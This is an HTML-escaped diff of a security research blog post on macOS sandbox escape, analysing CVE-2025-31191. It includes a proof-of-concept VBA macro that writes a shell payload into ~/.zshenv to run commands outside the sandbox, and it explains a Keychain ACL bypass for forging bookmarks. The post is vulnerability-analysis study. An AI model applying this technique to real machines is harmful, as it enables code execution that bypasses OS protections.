+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !qword_1000FFE38 )
+      qword_1000FFE38 = v2;
+    v4 = objc_msgSend(&amp;amp;OBJC_CLASS___NSProcessInfo, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;processInfo&amp;quot;&lt;/span&gt;);
+    v5 = objc_msgSend(v4, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;environment&amp;quot;&lt;/span&gt;);
+    v6 = objc_msgSend(v5, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;mutableCopy&amp;quot;&lt;/span&gt;);
+    v7 = (void *)objc_opt_class(v3);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(unsigned __int8)objc_msgSend(v7, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;isRunningInInstallEnvironment&amp;quot;&lt;/span&gt;) )
+    {
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFD90);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HOME&amp;quot;&lt;/span&gt;
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFDB0);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFDD0);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LOGNAME&amp;quot;&lt;/span&gt;
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFDF0);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;PATH&amp;quot;&lt;/span&gt;
+      objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFE10);// &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SHELL&amp;quot;&lt;/span&gt;
+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (unsigned int)csr_check(2LL) )
+        objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFE30);
+    }
+    objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFE50);
+    objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;removeObjectForKey:&amp;quot;&lt;/span&gt;, &amp;amp;off_1000CFE70);
+    v3-&amp;gt;_initialEnvironment = (NSDictionary *)objc_msgSend(v6, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;copy&amp;quot;&lt;/span&gt;);
+    objc_release(v6);
+    objc_msgSend(v3, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;setDelegate:&amp;quot;&lt;/span&gt;, v3);
+    v8 = objc_alloc(&amp;amp;OBJC_CLASS___NSMutableIndexSet);
+    v3-&amp;gt;_availableEquivalents = (NSMutableIndexSet *)objc_msgSend(v8, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;initWithIndexesInRange:&amp;quot;&lt;/span&gt;, 1LL, 9LL);
+    v3-&amp;gt;_windowEquivalents = (NSMutableDictionary *)objc_alloc_init(&amp;amp;OBJC_CLASS___NSMutableDictionary);
+    v9 = objc_msgSend(&amp;amp;OBJC_CLASS___NSUserDefaults, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;standardUserDefaults&amp;quot;&lt;/span&gt;);
+    v10 = objc_msgSend(v9, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;objectForKey:&amp;quot;&lt;/span&gt;, off_1000FF878);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v10 )
+      objc_msgSend(v3, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;setDefaultShell:&amp;quot;&lt;/span&gt;, v10);
+    objc_msgSend(v3, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;addObserver:forKeyPath:options:context:&amp;quot;&lt;/span&gt;, v3, &amp;amp;off_1000CFE90, 11LL, &amp;amp;unk_1000A4548);
+    v11 = objc_msgSend(&amp;amp;OBJC_CLASS___NSNotificationCenter, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;defaultCenter&amp;quot;&lt;/span&gt;);
+    objc_msgSend(
+      v11,
+      &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;addObserver:selector:name:object:&amp;quot;&lt;/span&gt;,
+      v3,
+      &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;handleWindowKeyChange:&amp;quot;&lt;/span&gt;,
+      NSWindowDidBecomeKeyNotification,
+      0LL);
+    v3-&amp;gt;_currentWorkspace = (TTWorkspace *)objc_alloc_init(&amp;amp;OBJC_CLASS___TTWorkspace);
+    objc_msgSend(&amp;amp;OBJC_CLASS___NSColor, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;setIgnoresAlpha:&amp;quot;&lt;/span&gt;, 0LL);
+    objc_msgSend(v3, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;initLowSwapSpaceWatcher&amp;quot;&lt;/span&gt;);
+  }
+  &lt;span class=&#34;hljs-built_in&#34;&gt;return&lt;/span&gt; v3;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;2-2-CVE&amp;#x2011;2025&amp;#x2011;31191-Security&amp;#x2011;Scoped-Bookmarks-based-Sandbox-Escape&#34;&gt;&lt;a href=&#34;#2-2-CVE&amp;#x2011;2025&amp;#x2011;31191-Security&amp;#x2011;Scoped-Bookmarks-based-Sandbox-Escape&#34; class=&#34;headerlink&#34; title=&#34;2.2 CVE&amp;#x2011;2025&amp;#x2011;31191: Security&amp;#x2011;Scoped Bookmarks based Sandbox Escape&#34;&gt;&lt;/a&gt;2.2 CVE&amp;#x2011;2025&amp;#x2011;31191: Security&amp;#x2011;Scoped Bookmarks based Sandbox Escape&lt;/h3&gt;&lt;p&gt;CVE-2025-31191 is based on a structural flaw that allowed sandboxed apps on macOS to exploit &lt;strong&gt;Security-Scoped Bookmarks&lt;/strong&gt; to access system resources without user approval.&lt;/p&gt;
+&lt;p&gt;In addition to CVE-2022-26696 discussed in Section 2.1, there were various other Launch Services-based vulnerabilities. Subsequently, Apple strengthened App Sandbox policies within Launch Services to prevent such vulnerabilities. XPC clients are now able to recognize whether they are in a sandboxed state, rendering past vulnerabilities such as &lt;strong&gt;CVE-2022-26706&lt;/strong&gt;, &lt;strong&gt;CVE-2021-30864&lt;/strong&gt;, and &lt;strong&gt;CVE-2022-26696&lt;/strong&gt; invalid.&lt;/p&gt;
+&lt;p&gt;These changes have also affected the Microsoft Office for macOS environment. Office apps are now configured to strictly follow macOS sandbox policies, making it difficult to attempt initial penetration using macros as before. However, we focused our analysis on the &lt;strong&gt;SSB (Security-Scoped Bookmark)&lt;/strong&gt; feature, which allows file access permissions to be stored like tokens, as it remains a potential threat.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Security-Scoped Bookmark?&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;macOS restricts app file access permissions for security reasons, and external files cannot be accessed without the user&amp;#x2019;s explicit approval. One of the representative features used for this purpose is &lt;strong&gt;Security-Scoped Bookmark&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;This Bookmark allows users to store access permissions for specific files or directories like a token once they have granted access. Apps can then store this Bookmark and use it later to access files without requiring user approval again.&lt;/p&gt;
+&lt;p&gt;Two key VBA APIs related to this feature have been newly introduced in the Office environment for macOS.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;AppleScriptTask&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;  This API allows macros to execute predefined AppleScripts. However, these scripts must be located in the &lt;code&gt;~/Library/Application Scripts/[bundle ID]/&lt;/code&gt; path, and since Office apps cannot access this path to create files, it was difficult to use macros for sandbox escape.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;GrantAccessToMultipleFiles&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;  This API prompts the user to select multiple files within the macro and grants access to those files outside the sandbox. It is particularly useful for large-scale tasks.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Among these, &lt;code&gt;AppleScriptTask&lt;/code&gt; appeared to have no significant security issues, so we conducted a thorough analysis centered on the &lt;code&gt;GrantAccessToMultipleFiles&lt;/code&gt; API.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;SSB Abuse&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Using the &lt;code&gt;GrantAccessToMultipleFiles&lt;/code&gt; API, users can access files outside the sandbox by manually selecting and approving files. However, we discovered that &lt;strong&gt;the user&amp;#x2019;s file access approval is retained even after rebooting&lt;/strong&gt;. In other words, this approval information is &lt;strong&gt;permanently stored&lt;/strong&gt; somewhere, and if exploited, it allows access to files outside the sandbox without additional user approval. !!&lt;/p&gt;
+&lt;p&gt;Based on this, we were able to come up with the following scenario.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The user selects a file normally and grants access permissions.&lt;/li&gt;
+&lt;li&gt;These permissions are stored in the form of a Security-Scoped Bookmark.&lt;/li&gt;
+&lt;li&gt;A malicious macro exploits this bookmark to access specific files without any additional approval.&lt;/li&gt;
+&lt;li&gt;For example, manipulating an initial execution file such as &lt;code&gt;~/.zshenv&lt;/code&gt; &amp;#x2192; enables command execution outside the sandbox.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;SSB exploitation through macros&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Based on the above scenario, we conducted the following tests.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Open Excel or Word and open a new document.&lt;/li&gt;
+&lt;li&gt;Press the shortcut key &lt;code&gt;Alt + F11&lt;/code&gt; &amp;#x2192; Open the VBA editor.&lt;/li&gt;
+&lt;li&gt;Select &lt;code&gt;Insert &amp;gt; Module&lt;/code&gt; from the top menu.&lt;/li&gt;
+&lt;li&gt;Paste the code and execute it.&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;        Sub Poc_GrantAccess()
+            Dim scptPath As String
+            Dim fileAccessGranted As Boolean
+            Dim filePermissionCandidates
+            Dim payload As String
+        
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos; Set the payload&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            payload = &amp;quot;echo pwn&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            &amp;apos;&lt;/span&gt; Grant file permissions
+            scptPath = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/Users/&amp;quot;&lt;/span&gt; &amp;amp; Environ(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/.zshenv&amp;quot;&lt;/span&gt;
+            filePermissionCandidates = Array(scptPath)
+            fileAccessGranted = GrantAccessToMultipleFiles(filePermissionCandidates)
+        
+            &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos; Create an Application Script&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            Open scptPath For Output As #1&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            Print #1, payload&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;            Close #1&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        End Sub&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;```    &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;        &lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image10.png)&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image11.png)&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;If an SSB created based on user approval information is exploited, subsequent accesses may bypass the protection of the sandbox policy.&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image12.png)&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;echo pwn executed successfully.&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&amp;gt; **SSB Storage Location and Structure Analysis**&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;After checking where this bookmark is stored, we found that the data storing the user&amp;apos;&lt;/span&gt;s choice (file access approval) was stored &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; a PLIST file inside the Containers directory.
+
+![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image13.png)
+
+![image.png](/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image14.png)
+
+The `Containers` directory is a special location that is not subject to App Sandbox restrictions, so even sandboxed apps can **freely access** files &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; this directory. This means that &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; a malicious app can manipulate this PLIST file to artificially insert SSB, it can steal arbitrary file access permissions without separate user approval!
+
+However... this PLIST file is not a simple text file but is structured as a **signed binary format**. Therefore, simply overwriting values or adding entries is not easy... 
+
+&amp;gt; **ScopedBookmarkAgent Analysis**
+
+To gain a deeper understanding of how this works, we reverse engineered the relevant macOS modules and analyzed their structure.
+
+By default, sandboxed apps must obtain file access permission from the user via an Open dialog to access external files. This Open dialog is handled by a sandbox-external service named `com.apple.appkit.xpc.openAndSavePanelService.xpc`.
+
+When the user selects a file, this service transmits the access permissions &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; the selected file to the app &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; the form of a sandbox extension. This extension is created by the kernel and is a token signed with `HMAC-SHA256`, containing the actual file path, permission information (such as `com.apple.app-sandbox.read-write`), file metadata, and more. Apps that receive this extension can access the file through the `libsystem_sandbox.dylib` sub-API.
+
+However, there was a limitation that this extension token was **invalidated upon each reboot**.
+
+To solve this, Apple introduced a new non-sandbox process called **ScopedBookmarkAgent**. This agent performs the following two roles.
+
+1. Verify the received sandbox extension and convert it into a Bookmark object that can be stored long-term.
+2. Generate and deliver a new sandbox extension token based on the stored Bookmark data.
+
+For example, apps like Microsoft Office can use SSB &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; the following way!
+
+- User approves file access &amp;#x2192; bookmark stored &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; `securebookmarks.plist`
+- Subsequent access to the same file &amp;#x2192; bookmark via ScopedBookmarkAgent &amp;#x2192; new extension token generated
+
+This bookmark object is also signed with HMAC-SHA256, and the key used is calculated as follows.
+&lt;/code&gt;&lt;/pre&gt;
+cryptoKey = HMAC-SHA256(secret, &amp;#x201C;[bundle-id]&amp;#x201D;)&lt;br&gt;```&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The &lt;code&gt;secret&lt;/code&gt; used here is stored in the &lt;code&gt;com.apple.scopedbookmarksagent.xpc&lt;/code&gt; item in &lt;strong&gt;macOS Keychain&lt;/strong&gt;, making it very difficult for attackers to arbitrarily sign or manipulate bookmarks. Ultimately, in order to forge bookmarks for sandbox escape, attackers must steal the &lt;strong&gt;ScopedBookmarkAgent&amp;#x2019;s&lt;/strong&gt; signing key or be able to insert valid bookmarks indirectly. It&amp;#x2019;s a bit complicated, isn&amp;#x2019;t it?&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Keychain ACL bypass&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image15.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;On macOS, &lt;strong&gt;Keychain&lt;/strong&gt; is a space for securely storing passwords and certificates. It can be considered similar to Windows Credential Manager.&lt;br&gt;An important feature of Keychain is that it has an &lt;strong&gt;Access Control List (ACL) that specifies which processes can access each item&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The Keychain item that caught my attention was &lt;code&gt;com.apple.scopedbookmarksagent.xpc&lt;/code&gt;, and its ACL was set to allow access only to &lt;strong&gt;ScopedBookmarkAgent&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;However&amp;#x2026;!&lt;/p&gt;
+&lt;p&gt;I discovered that this ACL only controls &lt;strong&gt;&amp;#x2018;read&amp;#x2019; permissions&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image16.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In other words, it was possible to delete existing items and register &lt;strong&gt;new items created&lt;/strong&gt; by attackers with the same names!&lt;/p&gt;
+&lt;p&gt;Attackers could even set &lt;strong&gt;ACL&lt;/strong&gt;s for new items themselves and configure them so that ScopedBookmarkAgent could access them freely.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image17.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This could be verified using the command.&lt;/p&gt;
+&lt;p&gt;As a result, if an attacker creates a new entry with a fixed secret value, ScopedBookmarkAgent will accept the key without suspicion and use it for signature verification.&lt;/p&gt;
+&lt;p&gt;Based on the above, an attacker could exploit the ACL structure of the keychain and the signature key derivation structure to &lt;strong&gt;manipulate and sign arbitrary SSBs&lt;/strong&gt;, thereby &lt;strong&gt;gaining a sandbox escape path&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;This vulnerability could affect all macOS sandboxed apps that use SSBs and was particularly dangerous because it could be exploited as a generic macOS Sandbox Escape technique not limited to a single app. &lt;/p&gt;
+&lt;p&gt;In this article, I studied Sandbox Escape! It was fun&amp;#x2026;!!!&lt;/p&gt;
+&lt;p&gt;I&amp;#x2019;ll study something interesting again next time~ &amp;gt;_o&lt;/p&gt;
+&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://support.apple.com/en-us/122375&#34;&gt;https://support.apple.com/en-us/122375&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/&#34;&gt;https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/&#34;&gt;https://www.microsoft.com/en-us/security/blog/2022/07/13/uncovering-a-macos-app-sandbox-escape-vulnerability-a-deep-dive-into-cve-2022-26706/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf&#34;&gt;https://objectivebythesea.org/v4/talks/OBTS_v4_rWaisberg.pdf&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/yo-yo-yo-jbo/macos_app_structure&#34;&gt;https://github.com/yo-yo-yo-jbo/macos_app_structure&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/&#34;&gt;https://wojciechregula.blog/post/macos-sandbox-escape-via-terminal/&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta name="author" content="j0dev, y2sman">
+  <meta name="keywords" content>
+  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
+  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">
+
+
+  <meta property="og:type" content="website"> 
+  <meta property="og:title" content="[Research] macOS: Part2 - Sandbox Escape (en) - hackyboiz">
+  <meta property="og:description" content="&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/&#34;&gt;macOS: Part0 - TCC Bypass&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/&#34;&gt;macOS: Part1 - SIP Bypass&lt;/a&gt; &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/MacOS_Sandbox_Escape.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;macOS: Part2 - Sandbox Escape &amp;#x2190; Now!&lt;/p&gt;
+&lt;p&gt;Hello~ I&amp;#x2019;m clalxk!&lt;/p&gt;
+&lt;p&gt;Today, following Part1, I studied Sandbox Escape.&lt;/p&gt;
+&lt;p&gt;From the concept of the macOS Sandbox to the analysis of a 1-day vulnerability (CVE-2025-31191), it&amp;#x2019;s all here&amp;#x2014;let&amp;#x2019;s learn together.. (&amp;gt;&amp;lt;)&lt;/p&gt;
+&lt;h2 id=&#34;0-App&#34;&gt;&lt;a href=&#34;#0-App&#34; class=&#34;headerlink&#34; title=&#34;0. App&#34;&gt;&lt;/a&gt;0. App&lt;/h2&gt;&lt;p&gt;If you&amp;#x2019;ve used Windows or Linux, the concept of an &lt;code&gt;App&lt;/code&gt; on macOS might feel unfamiliar. It&amp;#x2019;s unfamiliar, but not difficult b^_^b. Generally, when you run a single executable file (&lt;code&gt;.exe&lt;/code&gt;, &lt;code&gt;a.out&lt;/code&gt;), you think of the program starting immediately, loading libraries or config files from somewhere in the system as needed.&lt;/p&gt;
+&lt;p&gt;For example, on Windows, if you run &lt;code&gt;notepad++.exe&lt;/code&gt;, that one file launches the process.&lt;/p&gt;
+&lt;p&gt;During that process, required &lt;code&gt;.dll&lt;/code&gt; libraries are dynamically loaded from system folders or the installation path, and settings are stored externally in &lt;code&gt;.ini&lt;/code&gt; files or the registry.&lt;/p&gt;
+&lt;p&gt;However! On macOS, this structure is slightly different.&lt;/p&gt;
+&lt;p&gt;On macOS, an &lt;code&gt;App&lt;/code&gt; isn&amp;#x2019;t just a simple executable file but a &lt;strong&gt;bundle&lt;/strong&gt; with a &lt;strong&gt;directory structure&lt;/strong&gt; (&lt;strong&gt;Bundle&lt;/strong&gt;)&lt;/p&gt;
+&lt;p&gt;Although it looks like a single app in Finder, in Terminal you&amp;#x2019;ll see that &lt;code&gt;.app&lt;/code&gt; is a directory containing not only the executable but also all necessary &lt;strong&gt;resources, config files, plugins, code signature data, etc.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Think of macOS treating an app as a package that bundles &lt;strong&gt;everything needed to run the app&lt;/strong&gt; rather than a single program file.&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s look at the built-in Calculator app as an example!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Inside the &lt;code&gt;Contents&lt;/code&gt; folder, you&amp;#x2019;ll find.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;MacOS/&lt;/code&gt;: Folder containing the executable&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Info.plist&lt;/code&gt;: XML config file holding the app&amp;#x2019;s metadata&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Resources/&lt;/code&gt;: Icons, images, language packs, other resources&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PlugIns/&lt;/code&gt;: (Optional) Plugins&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;_CodeSignature/&lt;/code&gt;: (Optional) Code signature info&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;version.plist&lt;/code&gt;, &lt;code&gt;PkgInfo&lt;/code&gt;: (Optional) Other details&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;Info.plist&lt;/code&gt; is an XML-format file that holds important metadata about the app.&lt;/p&gt;
+&lt;p&gt;It includes the path to the executable, the app name, the bundle ID, version, and more.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;CFBundleExecutable&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;Calculator&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;CFBundleIdentifier&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;com.apple.calculator&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;#x2019;s try running the app!&lt;/p&gt;
+&lt;h3 id=&#34;0-1-Launching-an-App&#34;&gt;&lt;a href=&#34;#0-1-Launching-an-App&#34; class=&#34;headerlink&#34; title=&#34;0.1 Launching an App&#34;&gt;&lt;/a&gt;&lt;strong&gt;0.1 Launching an App&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;Launching an app essentially means &lt;strong&gt;creating a process&lt;/strong&gt; that runs the binary specified by the &lt;code&gt;CFBundleExecutable&lt;/code&gt; key. But which parent process launches it?&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;* &lt;code&gt;CFBundleExecutable&lt;/code&gt;: A key in the &lt;code&gt;Info.plist&lt;/code&gt; of a macOS app bundle specifying the name of the binary to execute.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The command &lt;code&gt;open -a Calculator&lt;/code&gt; is the same as double-clicking the Calculator app.&lt;/p&gt;
+&lt;p&gt;I ran &lt;code&gt;ps&lt;/code&gt; while Calculator was open:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/code&gt; is running, PID 5012. Its parent process (PPID) is &lt;code&gt;1&lt;/code&gt;!&lt;/p&gt;
+&lt;p&gt;On macOS, PID 1 is &lt;code&gt;/sbin/launchd&lt;/code&gt;. This daemon manages all system and user agents on macOS&amp;#x2014;think of it like Windows&amp;#x2019; &lt;code&gt;services.exe&lt;/code&gt; or Linux&amp;#x2019;s &lt;code&gt;systemd&lt;/code&gt;. It not only manages background services but also acts as the &lt;strong&gt;parent for every GUI-launched app&lt;/strong&gt;.&lt;/p&gt;
